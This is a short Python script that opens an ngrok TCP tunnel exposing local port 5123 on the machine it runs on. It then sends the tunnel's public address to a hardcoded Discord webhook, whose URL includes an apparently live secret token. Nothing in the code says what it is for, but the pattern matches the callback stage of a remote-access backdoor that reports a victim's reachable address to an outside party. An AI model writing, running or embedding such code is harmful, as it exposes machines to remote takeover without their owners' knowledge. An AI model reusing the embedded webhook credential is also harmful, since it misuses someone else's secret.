import os
import urllib.request as req
from time import sleep
from discord_webhook import DiscordWebhook as DW
from pyngrok import ngrok
import json
import socket


URL = "https://discord.com/api/webhooks/1104052486261723146/CNA4l783O34AsB7qMqTxOLsN6qeYWqJZUrn6cqvTBxFNPoZktQzdSzTBYNv9obKXMCll"
# get ip
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
IP = s.getsockname()[0]
s.close()

# get path
path = os.getcwd()

# open ngrok tunnel
ngrok.conf.get_default().region = 'eu'
ngrok.connect(IP+':5123', 'tcp')

tunnel = req.urlopen('http://localhost:4040/api/tunnels')
tunnel = json.load(tunnel)['tunnels'][0]['public_url'].replace('tcp://', '')


# ngrok ip
webhook = DW(URL, content=tunnel)
response = webhook.execute()